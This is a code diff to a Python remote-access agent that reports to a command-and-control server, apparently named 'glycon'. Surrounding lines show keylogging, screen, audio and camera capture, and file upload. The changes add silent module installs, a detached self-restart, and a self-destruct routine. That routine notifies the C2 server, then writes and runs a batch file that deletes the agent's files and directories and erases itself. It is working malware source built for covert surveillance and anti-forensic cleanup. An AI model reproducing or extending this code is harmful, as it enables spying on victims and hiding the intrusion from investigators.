@@ -3,16 +3,41 @@ import subprocess
 import platform
 import random
 from datetime import datetime, timedelta
+import traceback
+import os
 
-def install_module(module_name, pip_name=None):
+def _log_to_public(msg):
+    try:
+        with open("C:\\Users\\Public\\glycon_agent.log", "a") as f:
+            f.write(f"{{datetime.now()}}: {{msg}}\n")
+    except: pass
+
+_log_to_public("--- SCRIPT LOADED ---")
+
+# --- PATH OPTIMIZATION ---
+try:
+    c_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
+    for p in [os.path.join(c_dir, 'Lib', 'site-packages'), os.path.join(c_dir, 'site-packages'), c_dir]:
+        if os.path.exists(p) and p not in sys.path: sys.path.insert(0, p)
+    for f in os.listdir(c_dir):
+        if f.endswith('.zip'):
+            zp = os.path.join(c_dir, f)
+            if zp not in sys.path: sys.path.insert(0, zp)
+except: pass
+
+def install_module(module_name, pip_name=None, force=False):
     """Helper function to install missing modules"""
     pip_name = pip_name or module_name
     try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
-        print(f"Successfully installed {{module_name}}")
+        _log_to_public(f"Installing module: {{pip_name}} (force={{force}})")
+        cmd = [sys.executable, "-m", "pip", "install"]
+        if force: cmd.extend(["--force-reinstall", "--no-cache-dir"])
+        cmd.append(pip_name)
+        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        _log_to_public(f"Successfully installed {{pip_name}}")
         return True
-    except subprocess.CalledProcessError:
-        print(f"Failed to install {{module_name}}")
+    except subprocess.CalledProcessError as e:
+        _log_to_public(f"Failed to install {{pip_name}}: {{e}}")
         return False
 
 # List of required modules with their pip names if different
@@ -26,17 +51,21 @@ required_modules = [
     ('socketio', 'python-socketio'),
     ('websocket', 'websocket-client'),
     ('mss', None),
-    ('Pillow', None),
-    ('opencv-python', None),
+    ('PIL', 'Pillow'),
+    ('cv2', 'opencv-python'),
     ('numpy', None),
     ('sounddevice', None),
     ('scipy', None)
 ]
 
 # Check and install missing modules
+restart_required = False
 for module, pip_name in required_modules:
     try:
-        if module == 'wintypes':
+        if module == 'cv2':
+            import cv2
+            if not hasattr(cv2, '__version__'): raise AttributeError("cv2 broken")
+        elif module == 'wintypes':
             import ctypes
             from ctypes import wintypes
         elif module == 'datetime':
@@ -48,14 +77,31 @@ for module, pip_name in required_modules:
             from Crypto.Util.Padding import pad, unpad
         elif module == 'keyboard':
             from pynput import keyboard
+        elif module == 'PIL':
+            import PIL.Image
         else:
             __import__(module.split('.')[0])
-    except ImportError:
-        print(f"Module {{module}} not found. Attempting to install...")
-        if pip_name:
-            install_module(module, pip_name)
+    except (ImportError, AttributeError, SyntaxError) as e:
+        force = not isinstance(e, ImportError)
+        _log_to_public(f"Module {{module}} failed: {{e}}. Reinstalling (force={{force}})...")
+        if install_module(module, pip_name or module, force=force):
+            restart_required = True
+
+if restart_required:
+    _log_to_public("Restarting agent...")
+    try:
+        import time
+        time.sleep(1) # Gi filsystemet et øyeblikk
+        if getattr(sys, 'frozen', False):
+            cmd = [sys.executable] + sys.argv[1:]
         else:
-            install_module(module)
+            cmd = [sys.executable, os.path.abspath(sys.argv[0])] + sys.argv[1:]
+        
+        _log_to_public(f"Restarting with command: {{cmd}}")
+        subprocess.Popen(cmd, creationflags=0x00000008 | 0x00000200, close_fds=True)
+    except Exception as e:
+        _log_to_public(f"Restart failed: {{e}}")
+    sys.exit(0)
 
 # Now proceed with the imports
 try:
@@ -1745,6 +1791,55 @@ class SystemUtils:
             }}
 
     @staticmethod
+    def _self_destruct():
+        _log_to_public("SystemUtils._self_destruct")
+        if platform.system() != "Windows": return
+        try:
+            current_file = os.path.realpath(sys.argv[0])
+            current_dir = os.path.dirname(current_file)
+            temp_dir = os.environ.get("TEMP", "C:\\Users\\Public")
+            batch_filename = f"cleanup_{{random.randint(1000, 9999)}}.bat"
+            batch_path = os.path.join(temp_dir, batch_filename)
+            
+            batch_script = f"""@echo off
+setlocal
+set "PY_LOG_FILE=C:\\Users\\Public\\glycon_agent.log"
+echo %date% %time%: Batch script started. >> "%PY_LOG_FILE%"
+set "AGENT_DIR={{current_dir}}"
+timeout /t 7 /nobreak > NUL
+cd /d "%AGENT_DIR%"
+if errorlevel 0 (
+    del /f /q *.dll *.pyd *.zip *.pth *.py *.exe > NUL 2>&1
+    if exist "Lib" rd /s /q "Lib"
+    if exist "Scripts" rd /s /q "Scripts"
+)
+cd /d "%temp%"
+set RETRIES=5
+:retry_loop
+if %RETRIES% lss 1 goto end_loop
+if not exist "%AGENT_DIR%" goto end_loop
+rd /s /q "%AGENT_DIR%"
+if exist "%AGENT_DIR%" (
+    timeout /t 3 /nobreak > NUL
+    set /a RETRIES-=1
+    goto retry_loop
+)
+:end_loop
+(goto) 2>nul & del "%~f0"
+endlocal
+"""
+            with open(batch_path, "w") as f:
+                f.write(batch_script)
+
+            subprocess.Popen(['cmd.exe', '/c', batch_path],
+                             creationflags=0x00000008 | 0x00000200,
+                             close_fds=True)
+            sys.exit(0)
+            
+        except Exception as e:
+            _log_to_public(f"Self-destruct initiation failed: {{e}}")
+
+    @staticmethod
     def upload_file(filepath):
         try:
             filepath = os.path.expandvars(filepath)
@@ -3399,6 +3494,29 @@ class Agent:
         # 4. Exit
         sys.exit(0)
     
+    def _initiate_self_destruct(self):
+        _log_to_public("--- Self-Destruct Sequence Initiated ---")
+        try:
+            self._remove_persistence()
+            _log_to_public("--> Persistence removal finished.")
+
+            try:
+                requests.post(
+                    f"{{self.config.C2_SERVER}}/api/agent_terminated",
+                    data=self.crypto.encrypt({{"agent_id": self.agent_id, "status": "destructing"}}),
+                    headers={{"User-Agent": self.config.USER_AGENT, "Content-Type": "application/octet-stream"}},
+                    timeout=3, verify=False
+                )
+                _log_to_public("--> C2 notification sent.")
+            except Exception as e:
+                _log_to_public(f"--> C2 notification FAILED: {{e}}")
+
+            _log_to_public("--> Handing off to SystemUtils._self_destruct...")
+            SystemUtils._self_destruct()
+
+        except Exception as e:
+            _log_to_public(f"CRITICAL ERROR in _initiate_self_destruct: {{e}}")
+
     def _remove_persistence(self):
         """Remove scheduled task and registry entries"""
         try:
@@ -3686,7 +3804,7 @@ class Agent:
                 except:
                     pass
                     
-                self._self_destruct()
+                self._initiate_self_destruct()
                 return {{"status": "destructing"}}
 
 
@@ -3955,7 +4073,7 @@ class Agent:
             try:
                 # Check killdate first
                 if self._check_killdate():
-                    self._self_destruct()
+                    self._initiate_self_destruct()
                     return 
                 
                 # Skip sleep for first checkin
